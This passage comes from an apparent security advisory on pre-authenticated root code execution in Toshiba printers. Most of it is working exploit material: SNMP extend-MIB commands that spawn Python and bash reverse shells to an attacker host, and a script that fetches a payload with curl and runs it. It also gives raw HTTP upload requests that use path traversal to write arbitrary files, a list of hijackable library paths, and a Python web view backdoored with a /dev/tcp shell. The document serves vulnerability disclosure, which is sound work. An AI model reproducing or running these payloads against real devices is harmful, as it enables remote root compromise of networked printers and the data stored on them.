NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."cmd" = STRING: uid=0(root) gid=2000(trusted) groups=0(root)
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."cmd" = STRING: uid=0(root) gid=2000(trusted) groups=0(root)
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."cmd" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."cmd" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."cmd".1 = STRING: uid=0(root) gid=2000(trusted) groups=0(root)
</code></pre>
<p>Using this vulnerability will allow any attacker to get a root access on a remote Toshiba printer as shown below.</p>
<p>This following PoC will execute a connect-back shell with root privilege to 10.0.0.2:21/tcp:</p>
<pre><code>kali% snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private [ip] 'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /home/SYSROM_SRC/build/release/bin/python 'nsExtendArgs."cmd"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.0.0.2\",21));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."cmd" = STRING: /home/SYSROM_SRC/build/release/bin/python
NET-SNMP-EXTEND-MIB::nsExtendArgs."cmd" = STRING: -c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.0.0.2\",21));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"
kali% snmpbulkwalk -c private -v2c [ip] NET-SNMP-EXTEND-MIB::nsExtendObjects
</code></pre>
<p>And on the attacker machine, we will receive a shell on port 21/tcp:</p>
<pre><code>kali# nc -l -v -p 21
listening on [any] 21 ...
10.0.0.1: inverse host lookup failed: Unknown host 
connect to [10.0.0.2] from (UNKNOWN) [10.0.0.1] 43467
sh-4.1# uname -ap
Linux MFP12188257 3.10.38-ltsi-WR6.0.0.11_standard #3010 SMP Wed Jul 6 16:20:23 IST 2022 i686 GNU/Linux
sh-4.1# id
uid=0(root) gid=2000(trusted) groups=0(root)
sh-4.1# exit
</code></pre>
<p>The attacker will then get a full root access in the printer, including full access to the encrypted partition:</p>
<pre><code>kali# nc -l -v -p 443
listening on [any] 443 ...
10.0.0.1: inverse host lookup failed: Unknown host
connect to [10.0.0.2] from (UNKNOWN) [10.0.0.1] 36468
bash-4.1# df -h
df -h
Filesystem            Size  Used Avail Use% Mounted on
rootfs                4.8G  3.7G  904M  81% /
/dev/root              48M   28M   18M  62% /old_root
/dev/sda2             4.8G  3.7G  904M  81% /
/dev/sda13            4.8G   49M  4.5G   2% /platform
none                  1.5G  188K  1.5G   1% /dev
/dev/sda3             4.8G  1.3G  3.4G  28% /rollback
/dev/sda5              25G  904M   23G   4% /work
/dev/sda6             2.9G  620M  2.2G  23% /registration
/dev/sda7             976M  1.3M  908M   1% /backup
/dev/sda8              32G   60M   30G   1% /imagedata
/dev/sda9              94G   65M   89G   1% /application
/dev/mapper/enc_encryption
                      992M  2.6M  964M   1% /encryption
/dev/sda12            119G   60M  112G   1% /storage
tmpfs                 1.5G  3.7M  1.5G   1% /dev/shm
bash-4.1# mount
mount
rootfs on / type rootfs (rw)
/dev/root on /old_root type ext2 (rw,relatime,errors=continue,user_xattr)
proc on /old_root/proc type proc (rw,relatime)
/dev/sda2 on / type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/sda13 on /platform type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
proc on /proc type proc (rw,relatime)
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
none on /dev type tmpfs (rw,relatime,mode=755)
ramfs on /ramdisk type ramfs (rw,relatime,size=100m)
/dev/sda3 on /rollback type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/sda5 on /work type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/sda6 on /registration type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/sda7 on /backup type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/sda8 on /imagedata type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/sda9 on /application type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/mapper/enc_encryption on /encryption type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
/dev/sda12 on /storage type ext4 (rw,relatime,nodelalloc,nobarrier,data=ordered)
tmpfs on /dev/shm type tmpfs (rw,relatime,mode=755)
devpts on /dev/pts type devpts (rw,relatime,mode=600)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
bash-4.1#
</code></pre>
<p>The vulnerability is located inside net-snmpd, as net-snmpd supports the <code>NET-SNMP-EXTEND-MIB</code> extension MIB.</p>
<p>This extension allows the execution of code from the net-snmpd daemon, with root privileges, with 2 steps:</p>
<ol>
<li>Definition of a new MIB;</li>
<li>Execution of the new MIB.</li>
</ol>
<p>A bash payload is also provided:</p>
<p>This following PoC will download a shell script, save it inside <code>/dev/shm/pwn.sh</code> and execute it as root on the targeted printer:</p>
<pre><code>kali% cat /var/www/html/pwn.sh 
#!/bin/sh

bash -i &gt;&amp; /dev/tcp/10.0.0.2/443 0&gt;&amp;1

kali% cat ./remote-pwn.sh
#!/bin/sh

snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private $1 'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh 'nsExtendArgs."cmd"' = '-c "curl http://10.0.0.2/pwn.sh -o /dev/shm/pwn.sh"'
snmpbulkwalk -c private -v2c $1 NET-SNMP-EXTEND-MIB::nsExtendObjects
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private $1 'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh 'nsExtendArgs."cmd"' = '-c "chmod 755 /dev/shm/pwn.sh"'
snmpbulkwalk -c private -v2c $1 NET-SNMP-EXTEND-MIB::nsExtendObjects
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private $1 'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh 'nsExtendArgs."cmd"' = ' "/dev/shm/pwn.sh"'
snmpbulkwalk -c private -v2c $1 NET-SNMP-EXTEND-MIB::nsExtendObjects
</code></pre>
<p>Using this PoC to get a connect-back root shell:</p>
<pre><code>kali% ./remote-pwn.sh 10.0.0.1
NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."cmd" = STRING: /bin/sh
NET-SNMP-EXTEND-MIB::nsExtendArgs."cmd" = STRING: -c "curl http://10.0.0.2/pwn.sh -o /dev/shm/pwn.sh"
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 21
NET-SNMP-EXTEND-MIB::nsExtendCommand."cmd" = STRING: /bin/sh
NET-SNMP-EXTEND-MIB::nsExtendArgs."cmd" = STRING: -c "curl http://10.0.0.2/pwn.sh -o /dev/shm/pwn.sh"
NET-SNMP-EXTEND-MIB::nsExtendInput."cmd" = STRING:
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."cmd" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."cmd" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."cmd" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."cmd" = INTEGER: volatile(2)
NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."cmd" = STRING:   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."cmd" = STRING:   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    53  100    53    0     0     53      0  0:00:01 --:--:--  0:00:01   114
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."cmd" = INTEGER: 3
NET-SNMP-EXTEND-MIB::nsExtendResult."cmd" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."cmd".1 = STRING:   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
NET-SNMP-EXTEND-MIB::nsExtendOutLine."cmd".2 = STRING:                                  Dload  Upload   Total   Spent    Left  Speed
100    53  100    53    0     0     53      0  0:00:01 --:--:--  0:00:01   114
Error in packet.
Reason: inconsistentValue (The set value is illegal or unsupported in some way)
Failed object: NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd"
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 21
NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."cmd" = STRING: /bin/sh
NET-SNMP-EXTEND-MIB::nsExtendArgs."cmd" = STRING:  "/dev/shm/pwn.sh"
caTimeout: No Response from 10.0.0.1
</code></pre>
<p>And the connect-back shell script will connect to 10.0.0.2 on port 443/tcp, as defined in the previous <code>pwn.sh</code> script:</p>
<pre><code>kali# nc -l -v -p 443 
listening on [any] 443 ...                    
10.0.0.1: inverse host lookup failed: Unknown host 
connect to [10.0.0.2] from (UNKNOWN) [10.0.0.1] 36464
bash-4.1# uname -ap 
Linux MFP14144292 3.10.38-ltsi-WR6.0.0.11_standard #3513 SMP Tue Jul 5 09:58:22 IST 2022 i686 GNU/Linux
bash-4.1# id
uid=0(root) gid=2000(trusted) groups=0(root)
bash-4.1#
</code></pre>
<p>We can also review the configuration file located at <code>/encryption/al/network/config/snmpd.conf</code>, containing the default communities:</p>
<pre><code>bash-4.1# grep -v '^#' /encryption/al/network/config/snmpd.conf
rocommunity public

rocommunity6 public

rwcommunity private

rwcommunity6 private

com2sec udp       0.0.0.0/24     public

view all    included  .1                               80
view generaluser_view   excluded .1
view generaluser_view included .1.3.6.1.4.1.1129.2.3.50.1.3.23.2.1.3
view generaluser_view included .1.3.6.1.4.1.1129.2.3.50.1.3.21.4.1.3
view generaluser_view included .1.3.6.1.4.1.1129.2.3.50.1.3.21.4.1.4

access udpGroup                "toshibaAmerica"    v1      noauth   exact  all       all         none
access admin_priv_group              ""           usm       priv    prefix all       all         none
access admin_auth_group              ""           usm       auth    prefix all       all         none
access generaluser_priv_group        ""           usm       priv    prefix all  generaluser_view none
access generaluser_auth_group        ""           usm       auth    prefix all  generaluser_view none

trapcommunity public

dlmod  mibs_impl                        /home/SYSROM_SRC/lib/libalmibs_impl.so

master  off

agentaddress udp:161,udp6:161

authtrapenable 1

maxGetbulkRepeats 20

maxGetbulkResponses 100bash-4.1#
</code></pre>
<p>SNMP is also exposed over IPv6. </p>
<p><a id="pre-auth-rces-upload"></a></p>
<h2>Details - Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</h2>
<p>Toshiba printers provide several ways to upload files using the web interface.</p>
<p>By default, this web interface is reachable without authentication.</p>
<p>For example, using the e-filing web interface, freely reachable using http://ip:8080/?MAIN=EFILING, we can upload documents:</p>
<p><img alt="" src="images/2024-toshiba-pre-auth-upload-file-01.png" /></p>
<p><a href="images/2024-toshiba-pre-auth-upload-file-01-full.png">Click here for full image</a></p>
<p>It is possible to upload a document:</p>
<p><img alt="" src="images/2024-toshiba-pre-auth-upload-file-02.png" /></p>
<p><a href="images/2024-toshiba-pre-auth-upload-file-02-full.png">Click here for full image</a></p>
<p>The uploaded file will be stored inside the printer in the /work/al/tmp/upload/ directory, inside a directory named by the current session.</p>
<pre><code>bash-4.1# find /work/al/tmp/upload
/work/al/tmp/upload
/work/al/tmp/upload/ContentWebServer_10.0.0.2.f54c69d5d2b1963325041644084615ab
/work/al/tmp/upload/ContentWebServer_10.0.0.2.f54c69d5d2b1963325041644084615ab/test3.txt
/work/al/tmp/upload/ContentWebServer_10.0.0.2.f54c69d5d2b1963325041644084615ab/test1.txt
/work/al/tmp/upload/ContentWebServer_10.0.0.2.f54c69d5d2b1963325041644084615ab/test2.txt
bash-4.1# ls -latrR /work/al/tmp/upload
/work/al/tmp/upload:
total 12
drwxr-xr-x 7 root   lp      4096 Mar 24 05:35 ..
drwx------ 2 apache trusted 4096 Mar 24 05:43 ContentWebServer_10.0.0.2.f54c69d5d2b1963325041644084615ab
drwxrwxrwx 3 root   trusted 4096 Mar 24 05:46 .

/work/al/tmp/upload/ContentWebServer_10.0.0.2.f54c69d5d2b1963325041644084615ab:
total 20
-rw-rw-rw- 1 apache trusted    8 Mar 24 05:41 test1.txt
-rw-rw-rw- 1 apache trusted    9 Mar 24 05:42 test2.txt
-rw-rw-rw- 1 apache trusted    9 Mar 24 05:43 test3.txt
drwx------ 2 apache trusted 4096 Mar 24 05:43 .
drwxrwxrwx 3 root   trusted 4096 Mar 24 05:46 ..
bash-4.1#
</code></pre>
<p>This current session is provided by the printer when visiting the web interface without authentication.</p>
<p>An attacker can replay the HTTP request with a valid session obtained while browsing http://ip/?MAIN=EFILING without authentication, and change the path to the uploaded file. This path will then be used to store the file inside the remote printer.</p>
<p>For example, with a <code>Name</code> variable set to <code>/./../../../../../home/SYSROM_SRC/sbin/malicious.program</code>, the uploaded file is correctly written into <code>/home/SYSRM_SRC/sbin/malicious.program</code> inside the printer.</p>
<p>The HTTP request will be:</p>
<pre><code>POST /contentwebserver/upload HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------12552735029913057752829397207
Content-Length: 1011
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/efiling/UploadArchive.html?v=1517352288ta
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DDEVICE; Session=10.0.0.2.c8a776a2c87613d78cbb94c558269c61; IgnoreSessionTimeout=3
Upgrade-Insecure-Requests: 1

-----------------------------12552735029913057752829397207
Content-Disposition: form-data; name="formSubmitCompleteEventHandler"

frames[1].formSubmitComplete
-----------------------------12552735029913057752829397207
Content-Disposition: form-data; name="DeviceInformationModel"

&lt;DeviceInformationModel&gt;&lt;Command&gt;&lt;Move&gt;&lt;commandNode&gt;FileStorages&lt;/commandNode&gt;&lt;Params&gt;&lt;source&gt;&lt;File&gt;test.txt&lt;/File&gt;&lt;name&gt;Upload&lt;/name&gt;&lt;/source&gt;&lt;destination&gt;&lt;name&gt;DataImport&lt;/name&gt;&lt;/destination&gt;&lt;/Params&gt;&lt;/Move&gt;&lt;/Command&gt;&lt;/DeviceInformationModel&gt;
-----------------------------12552735029913057752829397207
Content-Disposition: form-data; name="CsrfpId"

10.0.0.2.c8a776a2c87613d78cbb94c558269c61
-----------------------------12552735029913057752829397207
Content-Disposition: form-data; name="/./../../../../../home/SYSROM_SRC/sbin/malicious.program"; filename="test.txt"
Content-Type: text/plain

MALICIOUS_CONTENT_WRITTEN_INTO_THE_HARD_DISK

-----------------------------12552735029913057752829397207--
</code></pre>
<p>Burp Request:</p>
<p><img alt="" src="images/2024-toshiba-pre-auth-upload-file-03.png" /></p>
<p><a href="images/2024-toshiba-pre-auth-upload-file-03-full.png">Click here for full image</a></p>
<p>And the file is correctly written into <code>/home/SYSRM_SRC/sbin/malicious.program</code> inside the printer:</p>
<p><img alt="" src="images/2024-toshiba-pre-auth-upload-file-04.png" /></p>
<p>This vulnerability can be used to get Remote Code Executions using several different ways. Due to some weaknesses found in Toshiba printers, there are hundreds different ways to get Remote Code Execution. For example:</p>
<ul>
<li>Upload of a malicious library defined in the LD_PRELOAD variable:<ul>
<li>/ramdisk/al/libGetNameInfoInterface.so or /ramdisk/al/libGetAddtInfoInterface.so can be overwritten by a malicious library</li>
</ul>
</li>
<li>Upload of a malicious library using the LD_LIBRARY_PATH variable - An attacker can upload malicious libraries inside:<ul>
<li>/home/SYSROM_SRC/build/release/lib,</li>
<li>/mfp/lib,</li>
<li>/home/SYSROM_SRC/NoBuildItems/common/lib,</li>
<li>/home/SYSROM_SRC/build/thirdparty/plugins/platforminputcontexts/,</li>
<li>/home/SYSROM_SRC/build/release/lib.</li>
</ul>
</li>
<li>Upload of a malicious program due to insecure permissions:<ul>
<li>As shown in <a href="#lpe-rce-106-programs">Local Privilege Escalation and Remote Code Execution using insecure permissions for 106 programs</a>, a lot of programs running as root can be overwritten due to insecure permissions (777)</li>
</ul>
</li>
<li>Upload a malicious Python program or a malicious Python library</li>
<li>...</li>
</ul>
<p>This lack of protection can be found in several HTML forms when using the printer, without administrative privileges. For example, the page at http://10.0.0.1:8080/Administration/maintenance/uploadsoft/DriverCustomize.html allows uploading any file:</p>
<p><img alt="" src="images/2024-toshiba-pre-auth-upload-file-05.png" /></p>
<p><a href="images/2024-toshiba-pre-auth-upload-file-05-full.png">Click here for full image</a></p>
<p>It is mandatory to inject a <code>&lt;INPUT TYPE=SUBMIT&gt;</code> in the server response using Burp or to directly generate such request to upload any file.</p>
<p>An example is shown below on how to get Remote Code Execution using the upload of a malicious Python script in the next section, using the following request:</p>
<pre><code>POST /contentwebserver/upload HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------394285998421640844852768059947
Content-Length: 1126
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/Administration/maintenance/uploadsoft/DriverCustomize.html
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DDEVICE; clicked=0; addrLastVisited=ADDRBK; IgnoreSessionTimeout=1; Session=10.0.0.2.5fb38c36e6e15dbe77652121b3d85e0c
Upgrade-Insecure-Requests: 1

-----------------------------394285998421640844852768059947
Content-Disposition: form-data; name="formSubmitCompleteEventHandler"

frames[0].formSubmitCompleteUploadList
-----------------------------394285998421640844852768059947
Content-Disposition: form-data; name="DeviceInformationModel"

&lt;DeviceInformationModel&gt;&lt;GetValue&gt;&lt;eFiling&gt;&lt;View&gt;&lt;BoxList/&gt;&lt;/View&gt;&lt;/eFiling&gt;&lt;/GetValue&gt;&lt;Command&gt;&lt;GetEFilingBoxes&gt;&lt;commandNode&gt;eFiling/BoxList&lt;/commandNode&gt;&lt;Params&gt;&lt;responseXpath contentType='XPath'&gt;eFiling/View/BoxList&lt;/responseXpath&gt;&lt;curPage contentType='Value'&gt;1&lt;/curPage&gt;&lt;pageSize contentType='Value'&gt;200&lt;/pageSize&gt;&lt;definedBox contentType='Value'&gt;true&lt;/definedBox&gt;&lt;/Params&gt;&lt;/GetEFilingBoxes&gt;&lt;/Command&gt;&lt;/DeviceInformationModel&gt;
-----------------------------394285998421640844852768059947
Content-Disposition: form-data; name="CsrfpId"

10.0.0.2.5fb38c36e6e15dbe77652121b3d85e0c
-----------------------------394285998421640844852768059947
Content-Disposition: form-data; name="test.txt"; filename="test.txt"
Content-Type: text/plain

test

-----------------------------394285998421640844852768059947--
</code></pre>
<p>And the file is correctly uploaded into the printer:</p>
<pre><code>bash-4.1# ls -la /work/al/tmp/upload/ContentWebServer_10.0.0.2.5fb38c36e6e15dbe77652121b3d85e0c/
total 12        
drwx------ 2 apache trusted 4096 May 27 19:34 .
drwxrwxrwx 3 root   trusted 4096 May 27 19:30 ..
-rw-rw-rw- 1 apache trusted    5 May 27 19:34 test.txt
bash-4.1# cat /work/al/tmp/upload/ContentWebServer_10.0.0.2.5fb38c36e6e15dbe77652121b3d85e0c/test.txt
test
bash-4.1#
</code></pre>
<p>We can find several webpages allowing exploiting the vulnerable <code>/contentwebserver/upload</code> API.</p>
<p>It was determined that these webpages are using the insecure <code>/contentwebserver/upload</code> API. They can be used by any attacker to upload any file into the printers:</p>
<ul>
<li>http://printer-ip/efiling/UploadFrame.html</li>
<li>http://printer-ip/efiling/UploadArchive.html</li>
<li>http://printer-ip/efiling/UploadFrame.html</li>
<li>http://printer-ip/efiling/UploadArchiveProgress.html</li>
<li>http://printer-ip/efiling/UpLoadArchiveClose.html</li>
<li>http://printer-ip/efiling/UploadArchiveButton.html</li>
<li>http://printer-ip/Registration/AddressBook/AddrImport.html</li>
<li>http://printer-ip/Registration/AddressBook/AddrImportListFrame.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/DriverCustomize.html</li>
<li>...</li>
</ul>
<p>Some of these files are directly reachable without authentication (e.g. Registration or efiling) and can be found without an admin account.</p>
<p><a id="pre-auth-rce-upload-wsgi-py"></a></p>
<h3>Remote Code Execution - Upload of a new .py module inside WSGI Python programs</h3>
<p>Some of the APIs and web interfaces of the printers are written in Python.</p>
<p>Since the permissions of these Python scripts inside the printers are insecure, a backdoored version of the <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py</code> has been uploaded as shown below:</p>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py</code> with a malicious payload added on line 25:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">1</span> <span style="color: #408080; font-style: italic">#! /usr/bin/env python</span>
 <span style="color: #666666">2</span> <span style="color: #408080; font-style: italic"># -*- coding: utf-8 -*-</span>
 <span style="color: #666666">3</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">sys</span>
 <span style="color: #666666">4</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">os</span>
 <span style="color: #666666">5</span> <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">pyramid.view</span> <span style="color: #008000; font-weight: bold">import</span> view_config
 <span style="color: #666666">6</span> <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">pyramid.exceptions</span> <span style="color: #008000; font-weight: bold">import</span> HTTPForbidden
 <span style="color: #666666">7</span> <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">pyramid.response</span> <span style="color: #008000; font-weight: bold">import</span> Response,FileResponse
 <span style="color: #666666">8</span> <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">server.screenfacade.appmgmt.applicationmanager</span> <span style="color: #008000; font-weight: bold">import</span> applicationManagementModel
 <span style="color: #666666">9</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">logging</span>
<span style="color: #666666">10</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">json</span>
<span style="color: #666666">11</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">pyeapicore</span>
<span style="color: #666666">12</span>
<span style="color: #666666">13</span> sys<span style="color: #666666">.</span>path<span style="color: #666666">.</span>append(<span style="color: #BA2121">&#39;/home/SYSROM_SRC/lib&#39;</span>)
<span style="color: #666666">14</span>
<span style="color: #666666">15</span> log <span style="color: #666666">=</span> logging<span style="color: #666666">.</span>getLogger(<span style="color: #BA2121">&quot;server&quot;</span>)
<span style="color: #666666">16</span>
<span style="color: #666666">17</span> <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span><span style="color: #BA2121">&#39;get_app_list_deployed&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>, renderer<span style="color: #666666">=</span><span style="color: #BA2121">&#39;jsonp&#39;</span>)
<span style="color: #666666">18</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">get_app_list_deployed</span>(request):
<span style="color: #666666">19</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;++++++++++++++++++++++++++++++++&quot;</span>)
<span style="color: #666666">20</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;get app list Views : Start &quot;</span>)
<span style="color: #666666">21</span>     SessionID <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>
<span style="color: #666666">22</span>     session <span style="color: #666666">=</span> <span style="color: #BA2121">&#39; &#39;</span>
<span style="color: #666666">23</span>     csrfpId <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>
<span style="color: #666666">24</span>     browserLang <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>
<span style="color: #666666">25</span>     os<span style="color: #666666">.</span>system(<span style="color: #BA2121">&quot;bash -i &gt;&amp; /dev/tcp/10.0.0.2/21 0&gt;&amp;1&quot;</span>)
<span style="color: #666666">26</span>
<span style="color: #666666">27</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;SessionID&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>cookies:
<span style="color: #666666">28</span>         SessionID <span style="color: #666666">=</span> request<span style="color: #666666">.</span>cookies[<span style="color: #BA2121">&#39;SessionID&#39;</span>]
<span style="color: #666666">29</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;Session&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>cookies:
<span style="color: #666666">30</span>         session <span style="color: #666666">=</span> request<span style="color: #666666">.</span>cookies[<span style="color: #BA2121">&#39;Session&#39;</span>]
<span style="color: #666666">31</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;csrfpId&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>headers:
<span style="color: #666666">32</span>         csrfpId <span style="color: #666666">=</span> request<span style="color: #666666">.</span>headers[<span style="color: #BA2121">&#39;csrfpId&#39;</span>]
<span style="color: #666666">33</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;BrowserLang&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>cookies:
<span style="color: #666666">34</span>         browserLang <span style="color: #666666">=</span> request<span style="color: #666666">.</span>cookies[<span style="color: #BA2121">&#39;BrowserLang&#39;</span>]
<span style="color: #666666">35</span>
<span style="color: #666666">36</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;Session ID obtained from request :&#39;</span> <span style="color: #666666">+</span> SessionID)
<span style="color: #666666">37</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;csrfpId obtained from request:&#39;</span> <span style="color: #666666">+</span> csrfpId)
<span style="color: #666666">38</span>     validationMap <span style="color: #666666">=</span> <span style="color: #008000">True</span>
<span style="color: #666666">39</span>
<span style="color: #666666">40</span>     <span style="color: #008000; font-weight: bold">if</span> validationMap[<span style="color: #BA2121">&#39;VALIDATION_STATUS&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;PASSED&#39;</span>:
<span style="color: #666666">41</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;User Validation : SUCCESS&#39;</span>)
<span style="color: #666666">42</span>         data <span style="color: #666666">=</span> applicationManagementModel<span style="color: #666666">.</span>getAppList(browserLang)
<span style="color: #666666">43</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;get app list Views : End &quot;</span>)
<span style="color: #666666">44</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;++++++++++++++++++++++++++++++++&quot;</span>)
<span style="color: #666666">45</span>         <span style="color: #008000; font-weight: bold">return</span> json<span style="color: #666666">.</span>dumps(data)
<span style="color: #666666">46</span>     <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">47</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&#39;User Validation : FAILURE&#39;</span>)
<span style="color: #666666">48</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;get app list Views : End &quot;</span>)
<span style="color: #666666">49</span>         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&quot;HTTP_REQUEST_FORBIDDEN&quot;</span> <span style="color: #AA22FF; font-weight: bold">in</span> validationMap:
<span style="color: #666666">50</span>             <span style="color: #008000; font-weight: bold">return</span> HTTPForbidden(<span style="color: #BA2121">&quot;Error 403 : Forbidden Request&quot;</span>)
<span style="color: #666666">51</span>         <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">52</span>             <span style="color: #008000; font-weight: bold">return</span> json<span style="color: #666666">.</span>dumps(validationMap)
<span style="color: #666666">53</span>
<span style="color: #666666">54</span> <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span><span style="color: #BA2121">&#39;start_background_application&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>, renderer<span style="color: #666666">=</span><span style="color: #BA2121">&#39;jsonp&#39;</span>)
<span style="color: #666666">55</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">start_background_application</span>(request):
<span style="color: #666666">56</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;++++++++++++++++++++++++++++++++&quot;</span>)
<span style="color: #666666">57</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;start background app : Start &quot;</span>)
[<span style="color: #666666">...</span>]
</pre></div>

